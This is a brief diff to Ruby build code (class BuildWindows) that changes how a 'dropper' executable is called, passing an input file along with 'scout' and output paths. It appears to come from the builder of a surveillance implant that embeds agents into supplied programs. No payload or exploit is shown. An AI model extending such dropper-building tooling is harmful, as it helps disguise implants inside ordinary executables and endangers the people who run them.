@@ -308,7 +308,7 @@ class BuildWindows < Build
     FileUtils.mv input, path('input')
 
     if @scout
-      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('output')
+      CrossPlatform.exec path('dropper'), '-s ' + path('scout') + ' ' + path('input') + ' ' + path('output')
     else
       CrossPlatform.exec path('dropper'), path(@scrambled[:core])+' '+
                                           (@bit64 ? path(@scrambled[:core64]) : 'null') +' '+
